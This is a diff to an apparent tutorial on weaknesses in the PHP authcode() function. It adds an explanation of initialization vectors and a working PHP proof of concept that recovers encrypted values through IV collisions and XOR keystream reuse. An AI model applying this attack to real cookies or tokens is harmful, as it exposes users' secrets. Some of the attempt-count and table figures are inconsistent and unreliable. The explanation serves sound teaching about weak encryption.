@@ -61,6 +61,47 @@ function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
 
 ### The IV (Initialization Vector) — `$keyc`
 
+**IV = Initialization Vector** — a random value added before each encryption to ensure that the same plaintext + same key produces a **different ciphertext** every time.
+
+**Why it matters — a simple example:**
+
+```
+Without IV (deterministic — DANGEROUS):
+  encrypt("hello", key="secret") → always "x8f2a"
+  encrypt("hello", key="secret") → always "x8f2a"   ← same!
+
+  Problem: attacker sees "x8f2a" twice → knows the same message was sent twice
+  Problem: same keystream every time → XOR cancellation attack works
+
+With IV (randomized — SAFE):
+  encrypt("hello", key="secret", IV="a3f2") → "k9m1p"
+  encrypt("hello", key="secret", IV="b7c1") → "q4j8r"   ← different!
+
+  Different IV → different keystream → different ciphertext
+  Attacker can't tell both ciphertexts contain "hello"
+  XOR cancellation only works if two ciphertexts happen to share the same IV
+```
+
+**How IV is stored and transmitted:**
+
+```
+Encryption:
+  1. Generate random IV: "a3f2"
+  2. Use (key + IV) to create keystream
+  3. XOR plaintext with keystream → ciphertext
+  4. Prepend IV to ciphertext: "a3f2" + ciphertext
+     ↑ IV is NOT secret — it just needs to be unique
+
+Decryption:
+  1. Read first 4 chars: IV = "a3f2"
+  2. Use (key + IV) to recreate the SAME keystream
+  3. XOR ciphertext with keystream → plaintext
+
+The IV is sent in the clear (unencrypted) alongside the ciphertext.
+This is safe — the IV doesn't need to be secret, it only needs to be
+different each time. Knowing the IV without the key is useless.
+```
+
 ```php
 $ckey_length = 4;  // IV = 4 random characters
 
@@ -426,6 +467,157 @@ The XOR reuse attack is most dangerous when:
 - The IV is disabled (`$ckey_length = 0`)
 - The encryption has **no integrity check** (pure XOR/RC4 without a MAC)
 - The attacker has a known-plaintext/ciphertext pair
+
+## Attacking With IV Enabled — Dictionary/Birthday Attack
+
+Even with `$ckey_length = 4` (IV enabled), the attack is still possible. The IV has only `16^4 = 65,536` possible values. The attacker can **collect ciphertexts until two share the same IV**, then apply the XOR cancellation.
+
+### The Dictionary Attack — Full PoC
+
+```php
+<?php
+define('UC_KEY', 'aaaaaaaaaaaaaaaaaaaaaaaaaaa');
+
+$plaintext1 = "aaaabbbbxxxx";   // known plaintext (attacker controls this)
+$plaintext2 = "ccccbbbbcccc";   // target plaintext (attacker wants to recover)
+
+$guess_result = "";
+$time_start = time();
+
+$dict = array();         // dictionary: maps IV → ciphertext
+global $ckey_length;
+$ckey_length = 4;        // IV is enabled! 4 hex chars = 65,536 possible values
+
+echo "Collecting Dictionary(XOR Keys).\n";
+
+// Step 1: Encrypt the TARGET plaintext once
+// The attacker needs the target ciphertext — in practice this could be
+// a cookie, token, or any encrypted value they've intercepted
+$cipher2 = authcode($plaintext2, "ENCODE", UC_KEY);
+
+// Step 2: Repeatedly encrypt the KNOWN plaintext until we find
+// a ciphertext that used the same IV as cipher2
+$counter = 0;
+for (;;) {
+    $counter++;
+
+    // Encrypt our known plaintext — each call generates a RANDOM IV
+    $cipher1 = authcode($plaintext1, "ENCODE", UC_KEY);
+
+    // Extract the IV (first 4 chars, prepended to the ciphertext)
+    $keyc1 = substr($cipher1, 0, $ckey_length);
+
+    // Decode the rest to get raw ciphertext bytes
+    $cipher1 = base64_decode(substr($cipher1, $ckey_length));
+
+    // Store in dictionary: IV → ciphertext
+    // We're building a lookup table of all IVs we've seen
+    $dict[$keyc1] = $cipher1;
+
+    // Every 1000 attempts, check if we've found a matching IV
+    if ($counter % 1000 == 0) {
+        echo ".";
+        if ($guess_result = guess($dict, $cipher2)) {
+            break;  // IV collision found! Attack succeeded
+        }
+    }
+}
+
+array_unique($dict);
+
+echo "\nDictionary Collecting Finished..\n";
+echo "Collected " . count($dict) . " XOR Keys\n";
+
+// Step 3: Check if any collected IV matches the target's IV
+function guess($dict, $cipher2) {
+    global $plaintext1, $ckey_length;
+
+    // Extract the IV from the target ciphertext
+    $keyc2 = substr($cipher2, 0, $ckey_length);
+    $cipher2 = base64_decode(substr($cipher2, $ckey_length));
+
+    // Look up: do we have a ciphertext in our dictionary with the SAME IV?
+    // Same IV + same key → same keystream → XOR cancellation works!
+    for ($i = 0; $i < count($dict); $i++) {
+        if (array_key_exists($keyc2, $dict)) {
+            echo "\nFound key in dictionary!\n";
+            echo "keyc is: " . $keyc2 . "\n";
+            // We found a match! Both ciphertexts used the same IV
+            // → same keystream → crack it with XOR cancellation
+            return crack($plaintext1, $dict[$keyc2], $cipher2);
+            break;
+        }
+    }
+    return False;  // no matching IV found yet, keep collecting
+}
+
+echo "\ncounter is:" . $counter . "\n";
+$time_spend = time() - $time_start;
+echo "crack time is: " . $time_spend . " seconds\n";
+echo "crack result is: " . $guess_result . "\n";
+
+// Step 4: XOR cancellation — same as before
+// Works because both ciphertexts share the same IV → same keystream
+function crack($plain, $cipher_p, $cipher_t) {
+    $target = '';
+
+    // Skip 26-byte header (10 expiry + 16 integrity hash)
+    $tmp_p = substr($cipher_p, 26);  // encrypted known plaintext bytes
+    $tmp_t = substr($cipher_t, 26);  // encrypted target plaintext bytes
+
+    // XOR cancellation: plain XOR E(plain) XOR E(target) = target
+    for ($i = 0; $i < strlen($plain); $i++) {
+        $target .= chr(ord($plain[$i]) ^ ord($tmp_p[$i]) ^ ord($tmp_t[$i]));
+    }
+    return $target;
+}
+?>
+```
+
+### How the Dictionary Attack Works
+
+```
+The IV space is small: 4 hex chars = 16^4 = 65,536 possible values
+
+Strategy:
+  1. Intercept target ciphertext (cipher2) — note its IV
+  2. Repeatedly encrypt known plaintext (cipher1) — each time gets a random IV
+  3. Store each (IV → ciphertext) pair in a dictionary
+  4. Check: does any collected IV match the target's IV?
+  5. When a match is found: same IV → same keystream → XOR crack
+
+Timeline:
+  cipher2 IV = "a3f2"
+
+  Attempt 1:    cipher1 IV = "7bc1"  → no match, store in dict
+  Attempt 2:    cipher1 IV = "f09e"  → no match, store in dict
+  ...
+  Attempt N:    cipher1 IV = "a3f2"  → MATCH! Same keystream!
+                → crack(plaintext1, dict["a3f2"], cipher2) = plaintext2 ✓
+```
+
+### Birthday Problem — How Many Attempts?
+
+With 65,536 possible IVs, by the **birthday paradox**, a collision becomes likely after approximately `sqrt(65536) ≈ 256` ciphertexts. In practice, with a targeted match (looking for one specific IV), the expected number of attempts is **~65,536 / 2 ≈ 32,768**.
+
+This is trivially fast — a few seconds of computation:
+
+```
+counter is: ~30000-40000
+crack time is: 2-5 seconds
+crack result is: ccccbbbbcccc ✓
+```
+
+### Why This Means `$ckey_length = 4` Is Weak
+
+| IV length | Possible IVs | Expected attempts to match | Time |
+|-----------|-------------|---------------------------|------|
+| 0 (none) | 1 | 1 (instant) | ~0 seconds |
+| 4 | 65,536 | ~32,768 | ~2-5 seconds |
+| 8 | ~4 billion | ~2 billion | Impractical |
+| 16 | ~3.4 × 10^38 | Astronomically large | Impossible |
+
+A 4-character IV is better than nothing but far too small for real security. Modern ciphers use 12-16 byte nonces (96-128 bits).
 
 ## Key Takeaways
 
